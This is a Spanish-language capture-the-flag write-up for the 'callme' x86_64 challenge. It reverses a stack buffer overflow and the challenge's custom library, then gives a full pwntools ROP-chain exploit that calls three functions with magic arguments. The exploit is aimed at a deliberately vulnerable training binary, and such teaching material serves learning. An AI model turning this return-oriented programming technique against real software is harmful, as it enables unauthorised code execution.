# Callme (x86\_64)

En este ejercicio nos dan varias cosas:

* El binario
* Un `.dat` con la flag
* 2 keys.dat que sirven para desencriptar la flag
* Una libc custom

Lo primero de todo vamos a ver las protecciones que tiene activadas:

```c
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'.'
Stripped:   No
```

Solo tiene NX, no podemos inyectar un shellcode. Vamos a hacer reversing del código con `guidra` para ver que sucede por detrás:

```c
void pwnme(void) {
    char local_28[32];

    memset(local_28, 0, 0x20);
    puts("Hope you read the instructions...\n");
    printf("> ");
    read(0, local_28, 0x200);
    puts("Thank you!");
    return;
}
```

Hay una función main que imprime un poco de texto y luego hace un call a la función `pwnme()`. Como podemos ver, esta función es vulnerable ya que nos deja hacer un buffer overflow ya que nos permite escribir 512 bytes en un array de 32 bytes.

Como en este stack frame solo hay ese array de 32 bytes la distancia al return address debería ser la siguiente:

```c
32 bytes del array + 8 bytes del rbp = 40 bytes
```

Ahora que sabemos que el offset hasta la dirección de retorno es 40 bytes tenemos control del flujo del programa pero, donde queremos saltar? No hay una función win en el binario así que podemos intentar hacer un ret2libc a system por ejemplo. Pero pasa una cosa, en la libc que nos dan no hay system:

```c
readelf -a ./libcallme.so | grep "system"

```

Si nos fijamos en las funciones del programa vamos a poder ver la siguiente:

```c
void usefulFunction(void)
{
    callme_three(4, 5, 6);
    callme_two(4, 5, 6);
    callme_one(4, 5, 6);

    exit(1);  // WARNING: Subroutine does not return
}
```

Desde `guidra` no vamos a poder ver información sobre esas 3 funciones que se llaman. Para saber que está pasando dentro de esas funciones hay que hacer algo he hecho por primera vez en mi vida en este ejercicio, que es hacer reversing a la libc. Esas 3 funciones tal vez de estar en el binario están dentro de la libc que nos dan por eso hay que usar `guidra` con ella para ver lo que contienen. Vamos a ver lo que contienen:

```c
void callme_one(long param_1, long param_2, long param_3)
{
    FILE *_stream;

    if ((param_1 != -0x2152411021524111) || 
        (param_2 != -0x3501454135014542) || 
        (param_3 != -0x2ff20ff22ff20ff3)) {
        puts("Incorrect parameters");
        exit(1);
    }

    _stream = fopen("encrypted_flag.dat", "r");
    if (_stream == (FILE *)0x0) {
        puts("Failed to open encrypted_flag.dat");
        exit(1);
    }

    char *g_buf = (char *)malloc(0x21);
    if (g_buf == (char *)0x0) {
        puts("Could not allocate memory");
        exit(1);
    }

    g_buf = fgets(g_buf, 0x21, _stream);
    fclose(_stream);

    puts("callme_one() called correctly");
    return;
}

```

La primera función comprueba si cada uno de los 3 argumentos que se le pasen coinciden con los que hay ahí, abre el archivo que tiene la flag y sitúa si contenido en el heap.

```c
void callme_two(long param_1, long param_2, long param_3)
{
    int iVar1;
    FILE *_stream;
    int i;

    if ((param_1 == -0x2152411021524111) &&
        (param_2 == -0x3501454135014542) &&
        (param_3 == -0x2ff20ff22ff20ff3)) {
        
        _stream = fopen("key1.dat", "r");
        if (_stream == (FILE *)0x0) {
            puts("Failed to open key1.dat");
            exit(1);
        }

        for (i = 0; i < 0x10; i++) {
            iVar1 = fgetc(_stream);
            *((byte *)g_buf + i) = *((byte *)g_buf + i) ^ (byte)iVar1;
        }

        puts("callme_two() called correctly");
        return;
    }

    puts("Incorrect parameters");
    exit(1);
}

```

Este vuelve a pedir los 3 argumentos y si se cumplen hará una operación que desencripte parcialmente el contenido del archivo que está situado en el heap.

```c
void callme_three(long param_1, long param_2, long param_3)
{
    int iVar1;
    FILE *_stream;
    int local_l4;

    if ((param_1 == -0x2152411021524111) &&
        (param_2 == -0x3501454135014542) &&
        (param_3 == -0x2ff20ff22ff20ff3))
    {
        _stream = fopen("key2.dat", "r");
        if (_stream == NULL) {
            puts("Failed to open key2.dat");
            exit(1);
        }

        for (local_l4 = 0x10; local_l4 < 0x20; local_l4++) {
            iVar1 = fgetc(_stream);
            g_buf[local_l4] = g_buf[local_l4] ^ (byte)iVar1;
        }

        if (*(ulong *)(g_buf + 4) == 0xdeadbeefdeadbeefUL &&
            *(ulong *)(g_buf + 0xc) == 0xcafebabecafebabeUL &&
            *(ulong *)(g_buf + 0x14) == 0xd00df00dd00df00dUL)
        {
            puts(g_buf);
            exit(0);
        }

        puts("Incorrect parameters");
        exit(1);
    }

    puts("Incorrect parameters");
    exit(1);
}

```

La ultima función abre al archivo `key2.dat` y hace la ultima fase de desencriptación al contenido del heap pidiendo anteriormente otra vez los 3 argumentos.

Entonces tenemos que conseguir hacer que el flujo del programa haga lo siguiente:

```c
callme_one() --> callme_two() --> callme_three()
```

Pero en cada función hay que mandarle sus argumentos necesarios los cuales son en todos:

* `0xdeadbeefdeadbeef`
* `0xcafebabecafebabe`
* `d00df00dd00df00d`

Para hacer esto, como estamos en 64 bits tenemos que primero setear los registros necesarios. Si debugeamos podemos ver que piden los siguientes:

```c++
004008f6    mov edx, 0x6
004008fb    mov esi, 0x5
00400900    mov edi, 0x4
00400905    call <EXTERNAL>::callme_three

0040090a    mov edx, 0x6
0040090f    mov esi, 0x5
00400914    mov edi, 0x4
00400919    call <EXTERNAL>::callme_two

0040091e    mov edx, 0x6
00400923    mov esi, 0x5
00400928    mov edi, 0x4
0040092d    call <EXTERNAL>::callme_one

```

Como podemos ver hay que poner como primer argumento RDI, como segundo RSI y como el tercero RDX.

Ahora tenemos que encontrar uno o varios gadgets que nos permitan insertar esos valores en los registros. Por suerte el programa tiene la siguiente función:

```c
000000000040093c <usefulGadgets>:
  40093c:	5f                   	pop    rdi
  40093d:	5e                   	pop    rsi
  40093e:	5a                   	pop    rdx
  40093f:	c3                   	ret
```

Esta función nos da los gadgets que necesitamos en uno. Por algún motivo no aparece en `guidra` y tuve que usar `objdump`. Podemos comprobar que existe el gadget con `RopGadget` también:

```c
ROPgadget --binary callme | grep "rdi"
. . .
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
. . .
```

Ahora que sabemos todo esto podemos hacer el script final:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./callme")
libc = ELF("./libcallme.so")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b usefulFunction
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("addr", 1337)

def main():
    io = conn()
    
    offset = 40
    pop_rdi_rsi_rdx = 0x0040093c
    
    payload = flat({
        offset: [
            pop_rdi_rsi_rdx,
            0xdeadbeefdeadbeef,
            0xcafebabecafebabe,
            0xd00df00dd00df00d,
            
            exe.plt.callme_one,
            
            pop_rdi_rsi_rdx,
            0xdeadbeefdeadbeef,
            0xcafebabecafebabe,
            0xd00df00dd00df00d,
            
            exe.plt.callme_two,
            
            pop_rdi_rsi_rdx,
            0xdeadbeefdeadbeef,
            0xcafebabecafebabe,
            0xd00df00dd00df00d,
            
            exe.plt.callme_three
        ]
    })

    io.sendlineafter(b'> ', payload)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

```c
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

Funciona. Gracias por leer!
